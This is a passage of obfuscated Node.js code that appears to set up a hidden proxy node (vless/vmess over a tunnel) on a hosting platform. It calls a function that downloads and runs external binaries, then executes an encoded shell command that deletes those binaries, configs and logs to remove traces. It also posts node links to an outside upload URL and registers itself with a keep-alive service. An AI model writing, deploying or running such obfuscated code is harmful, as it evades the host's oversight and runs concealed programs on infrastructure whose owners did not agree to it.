axios[_0x539c3a(_0x149019._0x429629)](_0x539c3a(_0x149019._0x136d6c),{'timeout':0xbb8});if(_0x5c293c[_0x539c3a(_0x149019._0x36177c)]&&_0x5c293c['data'][_0x539c3a(_0x149019._0x371a8b)]===_0x539c3a(_0x149019._0x10bbfb)&&_0x5c293c[_0x539c3a(_0x149019._0x53f6d9)][_0x539c3a(0x1da)]&&_0x5c293c[_0x539c3a(_0x149019._0x2b37ac)]['org'])return _0x5c293c[_0x539c3a(_0x149019._0x53f6d9)]['countryCode']+'_'+_0x5c293c[_0x539c3a(_0x149019._0x2b37ac)][_0x539c3a(0x220)];}catch(_0x132ded){}}return _0x539c3a(0x25e);}async function _0x2cf693(_0x36845c){const _0x4d2841={_0xb6cb14:0x276,_0x333929:0x1f8,_0x562a1b:0x1ea,_0x38669f:0x239,_0x42167a:0x287,_0x1e93a2:0x20d,_0x53af7a:0x1bd,_0x5edbb4:0x283,_0x312d52:0x20d,_0x3fea80:0x246},_0x18583f=await _0x459e79(),_0x325eea=NAME?NAME+'-'+_0x18583f:_0x18583f;return new Promise(_0x4b9391=>{const _0x45d9c0={_0x4804a1:0x1ee};setTimeout(()=>{const _0x35e7be=_0x4897,_0x524707={'v':'2','ps':''+_0x325eea,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x35e7be(0x1c3),'host':_0x36845c,'path':_0x35e7be(_0x4d2841._0xb6cb14),'tls':_0x35e7be(_0x4d2841._0x333929),'sni':_0x36845c,'alpn':'','fp':_0x35e7be(_0x4d2841._0x562a1b)},_0x5b22a7='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x35e7be(_0x4d2841._0x38669f)+_0x36845c+_0x35e7be(_0x4d2841._0x42167a)+_0x36845c+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x325eea+_0x35e7be(0x24c)+Buffer['from'](JSON['stringify'](_0x524707))[_0x35e7be(_0x4d2841._0x1e93a2)](_0x35e7be(_0x4d2841._0x53af7a))+_0x35e7be(0x24e)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x36845c+'&fp=firefox&type=ws&host='+_0x36845c+_0x35e7be(0x237)+_0x325eea+_0x35e7be(0x1fc);console['log'](Buffer[_0x35e7be(0x1bc)](_0x5b22a7)['toString'](_0x35e7be(0x1bd))),fs[_0x35e7be(_0x4d2841._0x5edbb4)](subPath,Buffer['from'](_0x5b22a7)[_0x35e7be(_0x4d2841._0x312d52)](_0x35e7be(0x1bd))),console[_0x35e7be(0x26f)](FILE_PATH+_0x35e7be(_0x4d2841._0x3fea80)),uploadNodes(),app[_0x35e7be(0x22a)]('/'+SUB_PATH,(_0x2a62b5,_0x1faf15)=>{const _0x136ca8=_0x35e7be,_0x2986e4=Buffer[_0x136ca8(0x1bc)](_0x5b22a7)['toString'](_0x136ca8(0x1bd));_0x1faf15[_0x136ca8(0x270)](_0x136ca8(0x267),_0x136ca8(_0x45d9c0._0x4804a1)),_0x1faf15[_0x136ca8(0x226)](_0x2986e4);}),_0x4b9391(_0x5b22a7);},0x7d0);});}}async function uploadNodes(){const _0x436dd5={_0x9ed3ad:0x232,_0xc46c0d:0x243,_0x648328:0x236,_0x47cadf:0x214,_0x23e47a:0x244},_0x2ccaa5=_0x2e8edd;if(UPLOAD_URL&&PROJECT_URL){const _0x5b604c=PROJECT_URL+'/'+SUB_PATH,_0x2eb36e={'subscription':[_0x5b604c]};try{const _0x5b6fec=await axios[_0x2ccaa5(_0x436dd5._0x9ed3ad)](UPLOAD_URL+_0x2ccaa5(0x219),_0x2eb36e,{'headers':{'Content-Type':_0x2ccaa5(_0x436dd5._0xc46c0d)}});return _0x5b6fec&&_0x5b6fec[_0x2ccaa5(_0x436dd5._0x648328)]===0xc8?(console['log'](_0x2ccaa5(0x266)),_0x5b6fec):null;}catch(_0x5f474d){if(_0x5f474d[_0x2ccaa5(0x240)]){if(_0x5f474d[_0x2ccaa5(0x240)][_0x2ccaa5(0x236)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2ccaa5(0x24f)](listPath))return;const _0x863aa2=fs[_0x2ccaa5(0x1c4)](listPath,_0x2ccaa5(0x230)),_0x1718d2=_0x863aa2[_0x2ccaa5(0x271)]('\x0a')[_0x2ccaa5(0x22d)](_0x12e868=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2ccaa5(0x1cf)](_0x12e868));if(_0x1718d2[_0x2ccaa5(0x1dc)]===0x0)return;const _0x100124=JSON[_0x2ccaa5(0x1dd)]({'nodes':_0x1718d2});try{const _0x95ebde=await axios['post'](UPLOAD_URL+_0x2ccaa5(_0x436dd5._0x47cadf),_0x100124,{'headers':{'Content-Type':'application/json'}});return _0x95ebde&&_0x95ebde[_0x2ccaa5(0x236)]===0xc8?(console['log'](_0x2ccaa5(_0x436dd5._0x23e47a)),_0x95ebde):null;}catch(_0x4decae){return null;}}else return;}}function cleanFiles(){const _0x4f6a0c={_0x4ad049:0x1ef,_0x387c36:0x26d,_0x1a3f15:0x1fb},_0x47e758={_0x34b74:0x22b};setTimeout(()=>{const _0x538439=_0x4897,_0x4d9d29=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4d9d29[_0x538439(0x1ef)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4d9d29[_0x538439(_0x4f6a0c._0x4ad049)](phpPath);process[_0x538439(0x274)]===_0x538439(0x210)?exec(_0x538439(_0x4f6a0c._0x387c36)+_0x4d9d29['join']('\x20')+'\x20>\x20nul\x202>&1',_0x537764=>{const _0x136e73=_0x538439;console[_0x136e73(_0x47e758._0x34b74)](),console[_0x136e73(0x26f)](_0x136e73(0x26c)),console['log'](_0x136e73(0x1fa));}):exec(_0x538439(0x285)+_0x4d9d29[_0x538439(_0x4f6a0c._0x1a3f15)]('\x20')+'\x20>/dev/null\x202>&1',_0x3b7aa9=>{const _0x47d106=_0x538439;console[_0x47d106(0x22b)](),console[_0x47d106(0x26f)](_0x47d106(0x26c)),console[_0x47d106(0x26f)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xc14800={_0x38892f:0x26f,_0x240c30:0x245,_0x2b800f:0x232,_0x448cc4:0x1f5,_0x4a6b6c:0x20c},_0x1886bc=_0x2e8edd;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1886bc(_0xc14800._0x38892f)](_0x1886bc(_0xc14800._0x240c30));return;}try{const _0x2665da=await axios[_0x1886bc(_0xc14800._0x2b800f)](_0x1886bc(0x264),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log'](_0x1886bc(_0xc14800._0x448cc4)),_0x2665da;}catch(_0x57aeb7){return console[_0x1886bc(0x1ec)](_0x1886bc(0x23c)+_0x57aeb7[_0x1886bc(_0xc14800._0x4a6b6c)]),null;}}async function startserver(){const _0x1dbedc=_0x2e8edd;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x213248){console['error'](_0x1dbedc(0x209),_0x213248);}}startserver()[_0x2e8edd(0x23a)](_0x8da567=>{const _0x51c741={_0x5c46fc:0x1ec},_0x1df5a9=_0x2e8edd;console[_0x1df5a9(_0x51c741._0x5c46fc)](_0x1df5a9(0x20b),_0x8da567);}),app['listen'](PORT,()=>console['log'](_0x2e8edd(0x1d4)+PORT+'!'));
